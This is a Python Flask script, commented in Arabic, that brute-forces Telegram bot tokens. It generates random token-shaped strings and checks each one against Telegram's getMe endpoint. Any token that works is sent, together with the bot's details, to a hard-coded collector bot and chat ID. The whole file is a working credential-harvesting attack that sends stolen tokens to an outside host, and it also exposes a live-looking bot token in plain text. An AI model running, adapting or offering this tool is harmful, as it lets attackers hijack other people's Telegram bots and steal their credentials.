from flask import Flask, jsonify
import telebot
import random
import requests
import threading

app = Flask(__name__)

# إعدادات البوت الذي سيستقبل التوكنات الصالحة
BOT_TOKEN = "7439399938:AAHqJ-BxvLwmN1lkKMjSjTlKeHjOXoY2ruQ"  # توكن البوت المستقبل
CHAT_ID = "7796858163"  # معرف الدردشة أو المستخدم الذي سيستقبل التوكنات الصالحة

# إعدادات توليد التوكنات
Z = '\033[1;31m'
a = ['AAG', 'AAF', 'AAH']
u = '0987654321'
o = '651'

def generate_token():
    """توليد توكن عشوائي"""
    t = random.choice(a)
    c = ''.join(random.choice(u) for i in range(9))
    r = ''.join(random.choice(o) for i in range(1))
    on = 'qwertyuioplkjhgfdsazxcvbnm1098765432QWERTYUIOPLKJHGFDSAZXCVBNM_'
    sso = ''.join(random.choice(on) for i in range(32))
    token = r + c + ':' + t + sso
    return token

def check_token(token):
    """التحقق من صحة التوكن باستخدام Telegram API"""
    url = f"https://api.telegram.org/bot{token}/getMe"
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            user_info = response.json()["result"]
            return {
                "status": "valid",
                "token": token,
                "user_info": user_info
            }
        else:
            return {"status": "invalid", "token": token}
    except:
        return {"status": "invalid", "token": token}

def send_to_bot(message):
    """إرسال رسالة إلى البوت"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    requests.post(url, json=payload)

# إرسال رسالة عند بدء تشغيل السيرفر
def notify_server_start():
    """إرسال رسالة عند بدء تشغيل السيرفر"""
    message = "🚀 **تم بدء تشغيل السيرفر بنجاح!**"
    send_to_bot(message)

# تنفيذ الإشعار عند بدء التشغيل
notify_server_start()

@app.route('/generate', methods=['GET'])
def generate_and_check():
    """واجهة API لتوليد التوكن والتحقق منه"""
    token = generate_token()
    result = check_token(token)
    if result["status"] == "valid":
        message = f"✅ **توكن صالح تم العثور عليه:**\n\n"
        message += f"**Token:** `{result['token']}`\n"
        message += f"**Bot ID:** `{result['user_info']['id']}`\n"
        message += f"**Username:** @{result['user_info']['username']}\n"
        message += f"**First Name:** {result['user_info']['first_name']}\n"
        message += f"**Can Join Groups:** {result['user_info'].get('can_join_groups', 'N/A')}\n"
        message += f"**Supports Inline Queries:** {result['user_info'].get('supports_inline_queries', 'N/A')}"
        send_to_bot(message)
    return jsonify(result)

if __name__ == '__main__':
    app.run(threaded=True)
